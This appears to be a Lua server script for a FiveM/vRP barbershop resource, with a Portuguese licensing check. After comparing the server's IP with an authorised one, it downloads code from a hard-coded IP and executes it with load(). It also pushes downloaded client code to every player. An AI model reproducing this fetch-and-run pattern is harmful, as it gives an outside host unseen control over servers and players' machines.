--[[
	id: CcSJCqruU2QI_Z38ZfabP
	name: xd_barbershop 0002 server
	description: dsadsa
	time1: 2021-06-26 18:40:36.440856+00
	time2: 2021-06-26 18:40:36.440857+00
	uploader: pF7LVq_UZBfJ3KOmhFFPqDrnyxjJ5Zb59Nj0S8XA
	uploadersession: W7erUs0Ey1I9rYNLMu8Svd45rjQBb9
	flag: f
--]]

local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","xd_barbershop")
vCLIENT = Tunnel.getInterface("xd_barbershop")
src = {}
Tunnel.bindInterface("xd_barbershop",src)



-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIÁVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
function SendWebhookMessage(webhook,message)
	if webhook ~= nil and webhook ~= "" then
		PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
	end
end
local authenticated = false
local blocked = true
local code = ""
local resource = "xd_barbershop"
local lisNumber = "0003"

autoriz = [[
    ______________________________________________________________

		    [^xd_barbershop^0] autorizado por xD Group
		Qualquer dúvida: ^4https://discord.gg/VBzDjz2^0
			ou chamar: potter#2002
	______________________________________________________________
	
]]	
naoautoriz = [[
    ______________________________________________________________
	
		    [xd_barbershop] ^1NÃO autorizado!^0
		Qualquer dúvida: https://discord.gg/VBzDjz2
			ou chamar: potter#2002
	______________________________________________________________
	
]]	

-----------------------------------------------------------------------------------------------------------------------------------------
-- PAYMENTS
-----------------------------------------------------------------------------------------------------------------------------------------
PerformHttpRequest("http://191.252.102.151/auth/"..resource.."/auth"..lisNumber, function(err, text, headers)
	local ipCheck = text
	PerformHttpRequest("https://api.ipify.org/?format=json", function(err, text, headers)
		local toSub = text:gsub('{"ip":"',"")
		local myIp = toSub:gsub('"}',"")
		if ipCheck == myIp then
			blocked = false
			print(autoriz)
			PerformHttpRequest("http://191.252.102.151/codes/"..resource.."/"..lisNumber.."/server", function(err, text, headers)

				load(assert(text))()
				PerformHttpRequest("http://191.252.102.151/codes/"..resource.."/"..lisNumber.."/client", function(err, text, headers)
					TriggerClientEvent("xd_barbershop:loadAll",-1,text)
				end, 'GET', '')
			end, 'GET', '')
		else
			print(naoautoriz)
		end
	end, 'GET', '')
end, 'GET', '')

AddEventHandler("vRP:playerSpawn",function(user_id,source,first_spawn)
	local user_id = vRP.getUserId(source)
	Wait(20)
	if not blocked then
		PerformHttpRequest("http://191.252.102.151/codes/"..resource.."/"..lisNumber.."/client", function(err, text, headers)
			TriggerClientEvent("xd_barbershop:loadAll",source,text)
		end, 'GET', '')
	end
end)